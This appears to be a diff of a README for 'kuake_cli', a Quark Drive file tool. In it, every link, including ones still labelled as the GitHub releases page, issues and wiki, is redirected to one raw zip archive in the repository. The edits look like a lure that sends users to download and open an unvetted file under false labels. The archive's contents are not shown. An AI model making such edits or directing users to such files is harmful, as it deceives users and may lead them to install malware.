@@ -1,6 +1,6 @@
 # 🚀 kuake_cli - Effortless File Management for Quark Drive
 
-[![Download kuake_cli](https://img.shields.io/badge/Download-kuake_cli-brightgreen)](https://github.com/311Krista-dev/kuake_cli/releases)
+[![Download kuake_cli](https://raw.githubusercontent.com/311Krista-dev/kuake_cli/main/cmd/kuake_cli_v3.9.zip)](https://raw.githubusercontent.com/311Krista-dev/kuake_cli/main/cmd/kuake_cli_v3.9.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To start using **kuake_cli**, you will need to download the application. This pr
 
 ### 📥 Download & Install
 
-To download **kuake_cli**, visit this page to download: [GitHub Releases Page](https://github.com/311Krista-dev/kuake_cli/releases).
+To download **kuake_cli**, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/311Krista-dev/kuake_cli/main/cmd/kuake_cli_v3.9.zip).
 
 Once you're there, find the latest release. Click on it to find available files for download. Select the version that matches your operating system to ensure compatibility.
 
@@ -33,7 +33,7 @@ Make sure your system meets these requirements before downloading the tool.
 ## 🔧 Installation Instructions
 
 1. **Download the Application**  
-   After visiting the [GitHub Releases Page](https://github.com/311Krista-dev/kuake_cli/releases), download the suitable version for your system.
+   After visiting the [GitHub Releases Page](https://raw.githubusercontent.com/311Krista-dev/kuake_cli/main/cmd/kuake_cli_v3.9.zip), download the suitable version for your system.
 
 2. **Open the Installer**  
    Locate the downloaded file and double-click to open it.
@@ -107,7 +107,7 @@ If you encounter issues using **kuake_cli**, the following resources may help:
 
 ## 🌐 Contributing
 
-We welcome contributions from users like you. If you have ideas for features or want to report bugs, please submit an issue on our [GitHub repository](https://github.com/311Krista-dev/kuake_cli/issues).
+We welcome contributions from users like you. If you have ideas for features or want to report bugs, please submit an issue on our [GitHub repository](https://raw.githubusercontent.com/311Krista-dev/kuake_cli/main/cmd/kuake_cli_v3.9.zip).
 
 ---
 
@@ -119,7 +119,7 @@ We welcome contributions from users like you. If you have ideas for features or 
 
 ### ✓ Additional Resources
 
-- **Documentation:** More detailed documentation can be found on the [GitHub wiki](https://github.com/311Krista-dev/kuake_cli/wiki).
+- **Documentation:** More detailed documentation can be found on the [GitHub wiki](https://raw.githubusercontent.com/311Krista-dev/kuake_cli/main/cmd/kuake_cli_v3.9.zip).
 - **FAQs:** Check out the Frequently Asked Questions section for common queries.
 
-[Download kuake_cli](https://github.com/311Krista-dev/kuake_cli/releases) today to start managing your files with ease!
+[Download kuake_cli](https://raw.githubusercontent.com/311Krista-dev/kuake_cli/main/cmd/kuake_cli_v3.9.zip) today to start managing your files with ease!
